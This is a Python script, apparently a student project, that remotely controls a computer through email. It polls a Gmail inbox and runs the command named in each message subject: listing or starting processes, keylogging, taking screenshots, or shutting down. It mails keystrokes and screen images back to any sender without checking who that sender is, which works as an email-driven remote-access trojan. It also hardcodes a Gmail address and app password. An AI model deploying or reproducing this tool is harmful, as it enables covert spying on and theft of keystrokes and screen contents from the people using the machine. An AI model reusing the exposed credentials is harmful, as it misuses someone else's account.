import smtplib
import imaplib
import email
import time
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.image import MIMEImage
from email.header import decode_header
import screenshot
import shutdown
from process_app import execute_msg
from keylogger import key_logger
from rd import Email
import json

smtp_server = 'smtp.gmail.com'  # SMTP server for Gmail
smtp_port = 587  # Port for TLS

username_checker = 'mangmaytinhremotecontrol@gmail.com'
password_checker = 'lmlx vrwx cwym hvqz'
username_receiver = ""

# CONNECT + LOGIN
imap = imaplib.IMAP4_SSL(host='imap.gmail.com', port=993)
imap.login(username_checker, password_checker)

def decode_email_header(header):
    decoded_parts = []
    for part, encoding in decode_header(header):
        if isinstance(part, bytes):
            decoded_parts.append(part.decode(encoding or 'utf-8'))
        else:
            decoded_parts.append(part)
    return ''.join(decoded_parts)

def extract_email_address(sender):
    start = sender.find('<')
    end = sender.find('>')
    if start != -1 and end != -1:
        return sender[start + 1:end]
    else:
        return sender

def send_email(sender, receiver, subject, body, image_data=None):
    msg = MIMEMultipart()
    msg["From"] = sender
    msg["To"] = receiver
    msg["Subject"] = subject
    msg["Reply-To"] = sender
    msg.attach(MIMEText(body, "plain"))
    if image_data is not None:
        image = MIMEImage(image_data, name="image.png")
        msg.attach(image)
    text = msg.as_string()
    server = smtplib.SMTP('smtp.gmail.com', 587)

    try:
        server.starttls()
        server.login(username_checker, password_checker)
        server.sendmail(sender, receiver, text)
    except Exception as e:
        print(f"Error sending email: {e}")
    finally:
        server.quit()

def send_feedback_email(sender, receiver, feedback_subject, feedback_body):
    msg = MIMEMultipart()
    msg["From"] = sender
    msg["To"] = receiver
    msg["Subject"] = feedback_subject
    msg["Reply-To"] = sender
    msg.attach(MIMEText(feedback_body, "plain"))

    text = msg.as_string()
    server = smtplib.SMTP(smtp_server, smtp_port)

    try:
        server.starttls()
        server.login(username_checker, password_checker)
        server.sendmail(sender, receiver, text)
    except Exception as e:
        print(f"Error sending feedback email: {e}")
    finally:
        server.quit()

def save_emails_to_json(emails, file_path):
    with open(file_path, 'w', encoding='utf-8') as file:
        data = [
            {"sender": extract_email_address(email.sender), "subject": email.subject, "snippet": email.snippet, "read": email.read}
            for email in emails
        ]
        json.dump(data, file, ensure_ascii=False, default=str)

def load_emails_from_json(file_path):
    try:
        with open(file_path, 'r') as file:
            data = json.load(file)
            if not data:
                return []
            emails = [Email(email["sender"], email["subject"], email["snippet"], email["read"]) for email in data]
            return emails
    except (FileNotFoundError, json.decoder.JSONDecodeError):
        return []

def CheckAndDo(cmd, sender_email):
    feedback_subject = "Command Execution Feedback"
    feedback_body = ""

    if cmd == 'applications':
        print("Applications")
        feedback_body = f"Command 'applications' executed successfully.\n{execute_msg(cmd)}"
        send_email(username_checker, sender_email, "List of applications:", execute_msg(cmd))
    elif cmd == 'processes':
        print("Processes")
        feedback_body = f"Command 'processes' executed successfully.\n{execute_msg(cmd)}"
        send_email(username_checker, sender_email, "List of processes:", execute_msg(cmd))
    elif 'Start' in cmd:
        feedback_body = f"Command 'Start' executed successfully.\n{execute_msg(cmd)}"
        send_email(username_checker, sender_email, "List of processes:", execute_msg(cmd))
    elif cmd == 'keylogger':
        print("Key Logger")
        feedback_body = f"Command 'keylogger' executed successfully.\nKeys pressed: {key_logger()}"
        send_email(username_checker, sender_email, "Keys pressed:", key_logger())
    elif cmd == 'screenshot':
        print("Screenshot")
        image_data = screenshot.screen_shot()
        feedback_body = "Command 'screenshot' executed successfully.\nSee attachment."
        send_email(username_checker, sender_email, "Screenshot Taken!", "See attachment: ", image_data)
    elif cmd == 'shutdown':
        print("Shutdown")
        feedback_body = "Command 'shutdown' executed successfully.\nPC is shutting down..."
        send_email(username_checker, sender_email, "Shutting Down PC!", "PC is shutting down...")
        shutdown.shutdown()

    # Send feedback email
    send_feedback_email(username_checker, sender_email, feedback_subject, feedback_body)

def main():
    cmd = 'start'
    emails = load_emails_from_json('D:\MMT\Project\Email\Remote-Control-Another-Computer-Using-Email-\email.json')

    while cmd != 'quit':
        imap.select("Inbox")
        res, mailIds = imap.search(None, '(UNSEEN)')
        for id in mailIds[0].decode().split():
            res, mailData = imap.fetch(id, '(RFC822)')
            message = email.message_from_string(mailData[0][1].decode())
            cmd = message.get("Subject")
            sender_email = message.get("From")
            username_receiver = sender_email
            new_email = Email(sender=sender_email, subject=cmd, snippet="", read=False)
            emails.append(new_email)  
            CheckAndDo(cmd.lower(), sender_email)

        imap.close()

        time.sleep(0.4)
        save_emails_to_json(emails, 'D:\MMT\Project\Email\Remote-Control-Another-Computer-Using-Email-\email.json')

    print("Bye !!!")
    imap.logout()

if __name__ == '__main__':
    main()
